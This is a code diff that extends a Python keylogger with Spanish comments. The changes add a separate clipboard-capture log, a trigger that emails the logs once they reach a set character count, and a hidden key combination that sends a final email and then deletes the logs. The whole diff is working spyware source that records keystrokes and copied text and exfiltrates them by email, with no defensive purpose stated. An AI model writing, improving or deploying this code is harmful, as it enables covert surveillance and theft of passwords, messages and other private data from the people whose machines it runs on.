@@ -19,18 +19,23 @@ class KeyLogger:
         self.__leerJson = LeerJSON(ruta_json=ruta_config)
         self.__correo = None
         self.__ruta_config = ruta_config
-        self.__nombre_log = self.__leerJson.get_valor("nombre_log")
+        self.__nombre_log_pulsaciones = self.__leerJson.get_valor("nombre_log_pulsaciones")
+        self.__nombre_log_portapapeles = self.__leerJson.get_valor("nombre_log_portapapeles")
         self.__enviar_hora_programada = self.__leerJson.get_valor("hora_programada")
         self.__horas_inactivo = self.__leerJson.get_valor("horas_inactivo")
         self.__minutos_inactivo = self.__leerJson.get_valor("minutos_inactivo")
         self.__segundos_inactivo = self.__leerJson.get_valor("segundos_inactivo")
         self.__tiempo_reenviar_correo = self.__leerJson.get_valor("tiempo_reenviar_correo")
+        self.__cantidad_maxima_caracteres = self.__leerJson.get_valor("caracteres_maximos")
         self.__nombre_sesion = getlogin()
         self.__sistema = f"{system()} {release()}"
-        self.__ruta_log = ""
+        self.__ruta_log = self.__leerJson.get_valor("ruta_log")
+        self.__ruta_log_pulsaciones = ""
+        self.__ruta_log_portapapeles = ""
         self.__fecha_inicio = ""
         self.__hora_inicio = ""
-        self.cabecera = ""
+        self.__cabecera = ""
+        self.__id_portapapeles = 0
         self.__caracteres_cabecera = 0
         self.__caracteres_log = 0
         self.__hora_actual = 0
@@ -62,7 +67,6 @@ class KeyLogger:
             "Key.media_volume_down": " <VOLUMEN - > ",
             "Key.media_volume_up": "<VOLUMEN + >",
             "Key.esc": " <ESC> ",
-            "Key.backspace": " <-1> ",
             "Key.left": " <- ",
             "Key.right": " -> ",
             "Key.up": " <UP> ",
@@ -119,7 +123,7 @@ class KeyLogger:
     # Iniciar KL
     def iniciar_primer_plano(self):
 
-        # Verificar si ya esta Corriendo
+        # Verificar si Ya Esta Corriendo
         if self.__corriendo:
             print("[!] Ya se esta Ejecutando")
             return
@@ -128,96 +132,117 @@ class KeyLogger:
         print("~~~ KL Iniciado ~~~")
         self.__corriendo = True
 
-        # Verificar si Horas, Minutos, Segundos es 0, Activar Modo: Hora Programada
+        # Modo Hora Programada
         if self.__horas_inactivo == 0 and self.__minutos_inactivo == 0 and self.__segundos_inactivo == 0:
             self.__estado_hora_programada = True
             self.__calcular_horas_restantes()
-            print(f"[+] Enviar en Hora programada [Activada]")
+            print(f"[+] Enviar en Hora Programada [Activada]")
             print(f"[+] Se Enviara a las: {self.__enviar_hora_programada[0]}h:{self.__enviar_hora_programada[1]}m:{self.__enviar_hora_programada[2]}s")
             print(f"[+] Faltan {self.__horas_restantes}h:{self.__minutos_restantes}m:{self.__segundos_restantes}s")
 
-        # Enviar Cada Cierto Tiempo
+        # Modo Inactividad
         else:
             print(f"[+] Se Enviara Cada: {self.__horas_inactivo}h:{self.__minutos_inactivo}m:{self.__segundos_inactivo}s")
+
+        # Modo Caracteres Maximos
+        if self.__cantidad_maxima_caracteres > 0:
+            print(f"[+] Se Enviara un Correo al Llegar a {self.__cantidad_maxima_caracteres} Caracteres")
+
+        # Obtener Estado de CAPSLOCK y NUMLOCK
+        self.__estado_capslock = self.__is_key_on(0x14)
+        self.__estado_numlock = self.__is_key_on(0x90)
 
         # Obtener Hora de Inicio
         self.__fecha_inicio = datetime.today().strftime("%d-%m-%y")
         self.__hora_inicio = datetime.today().strftime("%H:%M:%S")
 
-        # Obtener Estado de Teclas CapsLock y Numlock
-        self.__estado_capslock = self.__is_key_on(0x14)
-        self.__estado_numlock = self.__is_key_on(0x90)
-
         # Crear Cabecera
         caracteres_cabecera = len(f"{self.__nombre_sesion} {self.__fecha_inicio} {self.__hora_inicio} {self.__sistema}")
-        self.cabecera = f"{self.__nombre_sesion} {self.__fecha_inicio} {self.__hora_inicio} {self.__sistema}\n{"-" * caracteres_cabecera}\n"
-        self.__caracteres_cabecera = len(self.cabecera)
+        self.__cabecera = f"{self.__nombre_sesion} {self.__fecha_inicio} {self.__hora_inicio} {self.__sistema}\n{"-" * caracteres_cabecera}\n"
+        self.__caracteres_cabecera = len(self.__cabecera)
 
-        # Verificar si Nombre del Log esta Vacio, Colocar Nombre Usuario
-        if self.__nombre_log == "":
-            self.__nombre_log = f"key-log_{self.__nombre_sesion.replace(" ","_")}.txt"
-            print(f"[+] Nombre Log Vacio, Usando Predeterminado: {self.__nombre_log}")
+        # Crear Nombre Log Pulsaciones
+        if self.__nombre_log_pulsaciones == "": # Usar Nombre Predeterminado
+            self.__nombre_log_pulsaciones = f"key-log_{self.__nombre_sesion.replace(" ","_")}.txt"
+            print(f"[+] Nombre Log Pulsaciones Vacio, Usando Predeterminado: {self.__nombre_log_pulsaciones}")
+        else: # Usar Nombre Desde el JSON
+            self.__nombre_log_pulsaciones = f"{self.__nombre_log_pulsaciones}.txt"
+            print(f"[+] Nombre Log Pulsaciones Asignado Manualmente: {self.__nombre_log_pulsaciones}")
 
-        # Usar Nombre Asignado Desde el JSON
-        else:
-            self.__nombre_log = f"{self.__nombre_log}.txt"
-            print(f"[+] Nombre Log Asignado Manualmente: {self.__nombre_log}")
-        
-        # Crear Ruta log
-        self.__ruta_log = f"{self.__leerJson.get_valor("ruta_log").replace("%username%",self.__nombre_sesion)}{self.__nombre_log}"
+        # Crear Nombre Log Portapapeles
+        if self.__nombre_log_portapapeles == "": # Usar Nombre Predeterminado
+            self.__nombre_log_portapapeles = "key-log_ClipBoard.txt"
+            print(f"[+] Nombre Log Portapapeles Vacio, Usando Predeterminado: {self.__nombre_log_portapapeles}")
+        else: # Usar Nombre Desde el JSON
+            self.__nombre_log_portapapeles = f"{self.__nombre_log_portapapeles}.txt"
+            print(f"[+] Nombre Log Portapapeles Asignado Manualmente: {self.__nombre_log_portapapeles}")
 
-        # Verificar si ya hay uno Existente
+        # Crear Ruta logs
+        self.__ruta_log_pulsaciones = f"{self.__ruta_log.replace("%username%",self.__nombre_sesion)}{self.__nombre_log_pulsaciones}"
+        self.__ruta_log_portapapeles = f"{self.__ruta_log.replace("%username%", self.__nombre_sesion)}{self.__nombre_log_portapapeles}"
+
+        # Abrir Log Pulsaciones Existente
         try:
 
-            # Obtener Caracteres del Log
-            with open(self.__ruta_log, "r") as log:
+            # Obtener Caracteres del Log Pulsaciones
+            with open(self.__ruta_log_pulsaciones, "r") as log:
                 self.__caracteres_log = len(log.read())
 
-            # Borrar y Crear si Esta Vacio
+            # Verificar si esta Vacio
             if self.__caracteres_log == self.__caracteres_cabecera:
-                print("[-] Eliminando Log Vacio...")
-                try:
-                    remove(self.__ruta_log)
-                except Exception:
-                    print("[!] No se Pudo Eliminar")
-                print("[+] Log Viejo Eliminado Correctamente")
-                print("[-] Creando Log Nuevo...")
-                crear_log = open(self.__ruta_log, "x")
-                crear_log.close()
-                print("[+] Log Nuevo Creado Correctamente")
-                self.__agregar_texto(ruta_log=self.__ruta_log, contenido=f"{self.cabecera}")
+                print("[-] Log Pulsaciones Vacio, Eliminando Logs Vacios...")
+                logs = [
+                    (self.__ruta_log_pulsaciones, "Log Pulsaciones"),
+                    (self.__ruta_log_portapapeles, "Log Portapapeles")
+                ]
+                for ruta, nombre in logs:
+                    try:
+                        remove(ruta)
+                    except FileNotFoundError:
+                        print(f"[!] No se Encontro {nombre}")
+                print("[+] Logs Eliminados Correctamente")
 
-            # Agregar Contenido al Final si no Esta vacio
+                # Crear Log Pulsaciones Nuevo
+                print("[-] Creando Nuevo Log Pulsaciones...")
+                log = open(self.__ruta_log_pulsaciones, "x")
+                log.close()
+                self.__agregar_texto(ruta_log=self.__ruta_log_pulsaciones, contenido=f"{self.__cabecera}")
+                print("[+] Log Pulsaciones Creado Correctamente")
+            
+            # Agregar Contenido al Final si ya hay Algo Escrito
             else:
-                print("[!] Archivo Log Detectado, Se Continuara con el Archivo Existente")
-                self.__agregar_texto(ruta_log=self.__ruta_log, contenido=f"\n\n{self.cabecera}")
-                print(f"[+] Cargado Correctamente. Numero de Caracteres: {self.__caracteres_log}")
+                print("[-] Archivo Pulsaciones Detectado, Se Continuara con el Archivo Existente...")
+                self.__agregar_texto(ruta_log=self.__ruta_log_pulsaciones, contenido=f"\n\n{self.__cabecera}") # 2 Saltos de Linea para Separar Contenido Anterior
 
-        # Crear Archivo en Caso que no Exista
+                # Obtener Carcateres Log
+                with open(self.__ruta_log_pulsaciones, "r") as log:
+                    self.__caracteres_log = len(log.read())
+                    print(f"[+] Cargado Correctamente. Numero de Caracteres: {self.__caracteres_log}")
+
+        # Crear Log SINO EXISTE
         except FileNotFoundError:
-            print("[-] Archivo Log No Encontrado, Creando uno Nuevo...")
-            crear_log = open(self.__ruta_log, "x")
-            crear_log.close()
-            print("[+] Log Creado Correctamente")
-            self.__agregar_texto(ruta_log=self.__ruta_log, contenido=f"{self.cabecera}")
-        finally:
-            print("[+] Todo Listo...")
-            print("~~~~~~~~~~~~~~~~~~~\n")
+            print("[-] Archivo Pulsaciones No Encontrado, Creando uno Nuevo...")
+            log = open(self.__ruta_log_pulsaciones, "x")
+            log.close()
+            print("[+] Log Pulsaciones Creado Correctamente")
+            self.__agregar_texto(ruta_log=self.__ruta_log_pulsaciones, contenido=f"{self.__cabecera}")
 
-        # Crear Email Manager
-        self.__correo = Enviar_Email(ruta_config=self.__ruta_config, ruta_log=self.__ruta_log)
+        # Ultimos Procesos
+        finally:
+            self.__correo = Enviar_Email(ruta_config=self.__ruta_config, ruta_log_pulsaciones=self.__ruta_log_pulsaciones, ruta_log_portapapeles=self.__ruta_log_portapapeles)
+            print("[+] Todo Listo...")
+            print("~~~~~~~~~~~~~~~~~~~")
 
         # Imprimir Cabecera
-        print(self.cabecera)
+        print(self.__cabecera)
 
         # Iniciar Listener
         self.__listener = keyboard.Listener(
             on_press=self.__presionar_tecla,
             on_release=self.__soltar_tecla
-        )
-        self.__listener.start()
+        ).start()
 
-        # Correr Mientras KL este Activo
+        # Correr Mientras este Activo
         while(self.__corriendo):
             sleep(1)
             self.__verificar_hora_envio()
@@ -288,17 +313,48 @@ class KeyLogger:
                     print("[!] Se Enviara Correo en la Hora Programada")
                     self.__enviar_correo(mensaje_enviado="[+] Correo Enviado a la Hora Programada. Se Enviara de Nuevo en 24h")
 
+        # Modo: Caracteres Maximos (Solo Numeros Positivos)
+        if self.__cantidad_maxima_caracteres > 0:
+
+            if self.__caracteres_log >= self.__cantidad_maxima_caracteres:
+                self.__enviar_correo(mensaje_enviado="[+] Limite De Caracteres Alcanzado, Correo Enviado")
+
     # Enviar Correo
     def __enviar_correo(self, mensaje_enviado: str):
-        respuesta_correo = False
-        while(not respuesta_correo and self.__corriendo):
-            respuesta_correo = self.__correo.enviar_correo(mensaje_enviado=mensaje_enviado)
-            if not respuesta_correo:
+
+        # NO ENVIAR si Logs estan Vacios
+        if self.__caracteres_log == self.__caracteres_cabecera:
+            print("[!] Logs Vacios, No se Enviara Correo")
+            return
+
+        # Enviar Hasta que Servidor Regrese Respuesta
+        correo_enviado = False
+        while(not correo_enviado and self.__corriendo):
+            correo_enviado = self.__correo.enviar_correo(mensaje_enviado=mensaje_enviado)
+
+            # En Caso que Falle Esperar Tiempo Hasta Volver a Enviar
+            if not correo_enviado:
                 print(f"[!] Reenviando Correo en {self.__tiempo_reenviar_correo}s...")
                 sleep(self.__tiempo_reenviar_correo)
-        with open(self.__ruta_log, "w") as log:
-            print("[+] Se Limpio el log")
-            log.write(self.cabecera)
+
+        # Limpiar Log Principal y Agregar Cabecera
+        with open(self.__ruta_log_pulsaciones, "w+") as log:
+            print("[+] Se Limpio el log Pulsaciones")
+
+            # Obtener Hora de Inicio
+            self.__fecha_inicio = datetime.today().strftime("%d-%m-%y")
+            self.__hora_inicio = datetime.today().strftime("%H:%M:%S")
+
+            # Reiniciar Cabecera
+            caracteres_cabecera = len(f"{self.__nombre_sesion} {self.__fecha_inicio} {self.__hora_inicio} {self.__sistema}")
+            self.__cabecera = f"{self.__nombre_sesion} {self.__fecha_inicio} {self.__hora_inicio} {self.__sistema}\n{"-" * caracteres_cabecera}\n"
+            log.write(self.__cabecera) # Agregar Cabecera
+            log.seek(0) # Ir a Inicio del Archivo
+            self.__caracteres_log = len(log.read()) # Obtener Caracteres
+
+        # Limpiar Log Secundario
+        with open(self.__ruta_log_portapapeles, "w") as log:
+            print("[+] Se Limpio el log Portapapeles")
 
     # Calcular Horas Restantes del Envio
     def __calcular_horas_restantes(self):
@@ -323,7 +379,7 @@ class KeyLogger:
             # La Hora Programada es Hoy
             diferencia_segundos = tiempo_programado - tiempo_actual
 
-        # La Hora Programada es Mañana (24 horas después)
+        # La Hora Programada es Mañana (24 Horas Despues)
         else:
             diferencia_segundos = (24 * 3600) - (tiempo_actual - tiempo_programado)
         
@@ -336,7 +392,7 @@ class KeyLogger:
     def __presionar_tecla(self, key):
 
         # Parsear Key a Sring
-        self.key_str = str(key).replace("'","")
+        self.key_str = str(key).replace("'","") # Eliminar Comillas
 
         # Verificar si Mantiene SHIFT
         if self.key_str in ["Key.shift","Key.shift_r"] and not self.__shift_presionado:
@@ -345,31 +401,67 @@ class KeyLogger:
             return
 
         # Verificar si Mantiene CONTROL
-        elif self.key_str in ["Key.ctrl_l", "Key.ctrl_r"] and not self.__control_presionado:
+        if self.key_str in ["Key.ctrl_l", "Key.ctrl_r"] and not self.__control_presionado:
             self.__control_presionado = True
             print("Control Presionado")
             return
 
         # Verificar si Mantiene ALT
-        elif self.key_str in ["Key.alt_l", "Key.alt_gr"] and not self.__alt_presionado:
+        if self.key_str in ["Key.alt_l", "Key.alt_gr"] and not self.__alt_presionado:
             self.__alt_presionado = True
             print("Alt Presionado")
             return
 
-        # Verificar si Mantiene FUNCION
-        elif self.key_str == "<255>" and not self.__fn_presionado:
+        # Verificar si Mantiene FN (Solo Laptop)
+        if self.key_str == "<255>" and not self.__fn_presionado:
             self.__fn_presionado = True
             print("FN Presionado")
             return
 
-        # Verificar Combinacion para Detener Script (Control + Shift + Alt + F8)
+        # Combinacion para Detener Script (Control + Shift + Alt + F8)
         if self.__shift_presionado and self.__control_presionado and self.__alt_presionado and self.key_str == "Key.f8":
             print("[!] Combinacion de Cierre, Deteniendo Script...")
+            self.__agregar_texto(ruta_log=self.__ruta_log_pulsaciones, contenido=self.__fin_script)
+
+            # Enviar Correo
             print("[-] Enviando Correo...")
+            self.__enviar_correo(mensaje_enviado="[+] Correo Enviado Correctamente")
+
+            # Eliminar Logs
+            print("[-] Eliminando Logs...")
+            logs = [
+                (self.__ruta_log_pulsaciones, "Log Pulsaciones"),
+                (self.__ruta_log_portapapeles, "Log Portapapeles"),
+            ]
+            for ruta, nombre in logs:
+                try:
+                    remove(ruta)
+                except FileNotFoundError:
+                    print(f"[!] No Existe {nombre}")
+            print("[+] Logs Eliminados Correctamente")
+
+            # Finalizar KL
             print(self.__fin_script)
-            self.__agregar_texto(ruta_log=self.__ruta_log, contenido=self.__fin_script)
             self.__corriendo = False
             return False
+
+        # Verificar CONTROL + <-
+        if self.__control_presionado and self.key_str == "Key.left":
+            print(" <== ")
+            self.__agregar_texto(ruta_log=self.__ruta_log_pulsaciones, contenido=" <== ")
+            return
+        
+        # Verificar CONTROL + ->
+        if self.__control_presionado and self.key_str == "Key.right":
+            print(" ==>")
+            self.__agregar_texto(ruta_log=self.__ruta_log_pulsaciones, contenido=" ==> ")
+            return
+
+        # Verificar CONTROL + BACKSPACE
+        if self.__control_presionado and self.key_str == "Key.backspace":
+            print(" <--1> ")
+            self.__agregar_texto(ruta_log=self.__ruta_log_pulsaciones, contenido=" <--1> ")
+            return
 
         # Agregar Teclas Presionadas a Lista Combinacion si Alt esta Presionado
         if self.__alt_presionado:
@@ -378,10 +470,10 @@ class KeyLogger:
         # Verificar si esta en Diccionario de Teclas Especiales
         if self.key_str in self.__diccionario_especial:
 
-            # Verificar si NO Esta Presionadno Alt y esta en Diccionario Especial Ignorar
+            # Verificar si NO Esta Presionado Alt y esta en Diccionario Especial, Ignorar
             if not(self.key_str in self.__diccionario_especial and self.__alt_presionado):
                 print(self.__diccionario_especial.get(self.key_str))
-                self.__agregar_texto(ruta_log=self.__ruta_log, contenido=self.__diccionario_especial.get(self.key_str))
+                self.__agregar_texto(ruta_log=self.__ruta_log_pulsaciones, contenido=self.__diccionario_especial.get(self.key_str))
 
         # Verificar si esta en Diccionario de Combinaciones Control
         elif self.key_str in self.__diccionario_combinaciones:
@@ -389,11 +481,7 @@ class KeyLogger:
             # Omitir Combinaciones (Control + C) o (Control + X)
             if not (self.key_str == "\\x03" or self.key_str == "\\x18"):
                 print(self.__diccionario_combinaciones.get(self.key_str))
-                self.__agregar_texto(ruta_log=self.__ruta_log, contenido=self.__diccionario_combinaciones.get(self.key_str))
-
-        # Verificar si es NumLock o CapsLock
-        elif self.key_str in ["Key.caps_lock", "Key.num_lock"]:
-            return
+                self.__agregar_texto(ruta_log=self.__ruta_log_pulsaciones, contenido=self.__diccionario_combinaciones.get(self.key_str))
         
         # Cualquier Otra Tecla
         else:
@@ -403,26 +491,31 @@ class KeyLogger:
 
                 if self.__estado_capslock and self.__shift_presionado:
                     print(f"Es la Letra: {self.key_str.lower()}.") # CapsLock + Shift
-                    self.__agregar_texto(ruta_log=self.__ruta_log, contenido=self.key_str.lower())
+                    self.__agregar_texto(ruta_log=self.__ruta_log_pulsaciones, contenido=self.key_str.lower())
                 elif self.__estado_capslock:
                     print(f"Es la Letra: {self.key_str.upper()}.") # CapsLock
-                    self.__agregar_texto(ruta_log=self.__ruta_log, contenido=self.key_str.upper())
+                    self.__agregar_texto(ruta_log=self.__ruta_log_pulsaciones, contenido=self.key_str.upper())
                 elif self.__shift_presionado:
                     print(f"Es la Letra: {self.key_str.upper()}.") # Shift
-                    self.__agregar_texto(ruta_log=self.__ruta_log, contenido=self.key_str.upper())
+                    self.__agregar_texto(ruta_log=self.__ruta_log_pulsaciones, contenido=self.key_str.upper())
                 else:
                     print(f"Es la Letra: {self.key_str.lower()}.") # Ninguno
-                    self.__agregar_texto(ruta_log=self.__ruta_log, contenido=self.key_str.lower())
+                    self.__agregar_texto(ruta_log=self.__ruta_log_pulsaciones, contenido=self.key_str.lower())
             
             # Verificar si es Numero
             elif self.key_str.isnumeric():
                 print(f"Numero: {self.key_str}")
-                self.__agregar_texto(ruta_log=self.__ruta_log, contenido=self.key_str)
+                self.__agregar_texto(ruta_log=self.__ruta_log_pulsaciones, contenido=self.key_str)
+
+            # Verificar si es BACKSPACE
+            elif self.key_str == "Key.backspace":
+                print(" <-1> ")
+                self.__agregar_texto(ruta_log=self.__ruta_log_pulsaciones, contenido=" <-1> ")
 
             # Simbolo o Combinacion no Identificada
             else:
                 print(self.key_str)
-                self.__agregar_texto(ruta_log=self.__ruta_log, contenido=self.key_str)
+                self.__agregar_texto(ruta_log=self.__ruta_log_pulsaciones, contenido=self.key_str)
 
         # Verificar que NO Este Hora Programada Activada
         if not self.__estado_hora_programada:
@@ -434,6 +527,11 @@ class KeyLogger:
         else:
             self.__calcular_horas_restantes()
             print(f"[+] Faltan {self.__horas_restantes}h:{self.__minutos_restantes}m:{self.__segundos_restantes}s")
+
+        # Mostrar Caracteres Actuales en Log
+        with open(self.__ruta_log_pulsaciones, "r") as log:
+            self.__caracteres_log = len(log.read())
+            print(f"[+] Caracteres Actuales: {self.__caracteres_log}")
         
     # Evento Soltar Tecla
     def __soltar_tecla(self, key):
@@ -447,12 +545,12 @@ class KeyLogger:
             print("Shift Soltado")
 
         # Verificar si Suelta CONTROL
-        elif self.key_str in ["Key.ctrl_l", "Key.ctrl_r"]:
+        if self.key_str in ["Key.ctrl_l", "Key.ctrl_r"]:
             self.__control_presionado = False
             print("Control Soltado")
 
         # Verificar si Suelta ALT
-        elif self.key_str in ["Key.alt_l", "Key.alt_gr"]:
+        if self.key_str in ["Key.alt_l", "Key.alt_gr"]:
             self.__alt_presionado = False
             print("Alt Soltado")
 
@@ -463,29 +561,38 @@ class KeyLogger:
                 if (self.__lista_combinacion[0] == "Key.right" and self.__lista_combinacion[1] == "Key.left" or
                     self.__lista_combinacion[0] == "<102>" and self.__lista_combinacion[1] == "<100>"):
                         print("@")
-                        self.__agregar_texto(ruta_log=self.__ruta_log, contenido="@")
+                        self.__agregar_texto(ruta_log=self.__ruta_log_pulsaciones, contenido="@")
             self.__lista_combinacion.clear()
 
         # Verificar si Suelta FN
-        elif self.key_str == "<255>":
+        if self.key_str == "<255>":
             self.__fn_presionado = False
             print("FN Soltado")
         
-        # Verificar si Suelta CapsLock
-        elif self.key_str == "Key.caps_lock":
+        # Verificar si Suelta CAPSLOCK
+        if self.key_str == "Key.caps_lock":
             self.__estado_capslock = self.__is_key_on(0x14)
             print(f"CapsLock: {self.__estado_capslock}")
             
-        # Verificar si Suelta NumLock
-        elif self.key_str == "Key.num_lock":
+        # Verificar si Suelta NUMLOCK
+        if self.key_str == "Key.num_lock":
             self.__estado_numlock = self.__is_key_on(0x90)
             print(f"NumLock: {self.__estado_numlock}")
 
         # Verificar si Suelta (Control + C) o (Control + X)
-        elif self.key_str == "\\x03" or self.key_str == "\\x18":
+        if self.key_str == "\\x03" or self.key_str == "\\x18":
+
+            # Obtener Texto Copiado
             texto_copiado = paste()
             print(f"Se Copio: {texto_copiado}")
-            self.__agregar_texto(ruta_log=self.__ruta_log, contenido=f" <Se Copio: {texto_copiado} > ")
+            separador = "------------------------------"
+
+            # Agregar Contenido a Logs
+            self.__agregar_texto(ruta_log=self.__ruta_log_portapapeles, contenido=f"[{self.__id_portapapeles}]{separador}\n{texto_copiado}\n")
+            self.__agregar_texto(ruta_log=self.__ruta_log_pulsaciones, contenido=f" <ID_CLIPBOARD: {self.__id_portapapeles}> ")
+            
+            # Sumar Contador ID
+            self.__id_portapapeles += 1
 
     # Agregar Contenido a Log
     def __agregar_texto(self, ruta_log: str, contenido: str):
